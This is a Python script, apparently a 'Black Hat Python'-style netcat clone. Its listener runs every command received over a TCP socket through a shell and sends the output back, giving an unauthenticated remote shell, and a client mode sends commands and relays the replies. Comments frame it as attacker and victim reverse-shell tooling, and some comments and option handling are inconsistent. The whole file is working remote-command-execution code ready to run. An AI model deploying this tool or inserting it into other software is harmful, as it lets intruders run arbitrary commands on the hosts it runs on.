# NETCAT Copy in Python
import sys
import socket
import getopt
import threading
import subprocess

# Global variables
listen = False
target = ""
port = 0

# Function to run commands from the reverse shell
def run_command(cmd):
    # Convert the command from bytes to string (decode to handle Windows subprocess properly)
    cmd = cmd.decode("utf-8").rstrip()

    try:
        # Use subprocess to run the command and capture output
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    return output

# Handling incoming client connections (victim's reverse shell)
def client_handler(client_socket):
    while True:
        try:
            # Receive the command from the server (attacker)
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # Execute the command and send back the results
            response = run_command(cmd_buffer)
            client_socket.send(response)

        except Exception as e:
            print(f"[*] Exception: {e}")
            client_socket.close()
            break
#let's work on incoming connections:
def server_loop():
    global target
    global port

    # Listen on all available interfaces if no target specified
    if not target:
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    print(f"[*] Listening on {target}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

        # Spin up a new thread to handle the client (victim)
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

#Ff we are not listening, we are a client. Then:
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        #If we detect input from stdin, we'll send it, if not we keep waiting
        if len(buffer):
            client.send(buffer.encode("utf-8"))

        while True:
            recv_len = 1
            response = b""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            
            print(response.decode("utf-8"), end=" ")

            #wait for further input and then send it off
            buffer = input("")
            buffer += "\n"
            client.send(buffer.encode("utf-8"))

    except (socket.error, KeyboardInterrupt, EOFError) as e:
        print(f"[*] Exception caught. Exiting.")
        print(f"[*] Details of error: {e}")
        client.close()

# Function to display usage instructions
def usage_info():
    print("Netcat Copy (Simplified)")
    print("")
    print("Usage: bhp_net.py -t target_host -p port")
    print("-l --listen    - listen on [host]:[port] for incoming connections (e.g., reverse shell)")
    print("")
    print("Examples:")
    print("netcat.py -t 192.168.0.1 -p 555 -l")
    sys.exit()

# Main function to handle argument parsing and script logic
def main():
    global listen
    global port
    global target

    if not len(sys.argv[1:]):
        usage_info()

    # Read command-line options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "lt:p:", ["listen", "target", "port"])
        for o, a in opts:
            if o in ("-l", "--listen"):
                listen = True
            elif o in ("-t", "--target"):
                target = a
            elif o in ("-p", "--port"):
                port = int(a)
            else:
                assert False, "Unhandled option"
    
    except getopt.GetoptError as e:
        print(str(e))
        usage_info()

    # If we're in client mode (not listening), connect to the target
    if not listen and len(target) and port > 0:
        # Read the buffer from command line input (if available)
        buffer = sys.stdin.read()

        # Send the data off to the target
        client_sender(buffer)

    # If we're in listen mode, start the server loop
    if listen and port > 0:
        server_loop()

main()